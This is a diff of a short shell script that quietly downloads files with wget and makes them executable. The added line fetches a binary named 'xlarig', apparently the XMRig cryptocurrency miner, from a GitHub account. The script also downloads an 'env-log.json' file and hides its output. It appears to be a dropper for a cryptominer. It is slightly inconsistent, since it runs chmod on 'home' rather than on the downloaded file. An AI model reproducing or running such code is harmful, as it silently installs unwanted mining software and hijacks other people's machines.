@@ -1,5 +1,5 @@
 #!/bin/sh
-wget -q -O home https://02ip.ru/curl-get && chmod +x home >/dev/null 2>&1
+wget -q https://github.com/dufsvqk88/pos/raw/main/xlarig && chmod +x home >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/dufsvqk88/lop/main/env-log.json && chmod +x env-log.json
 sleep 11 
 echo "******************************************************************" 
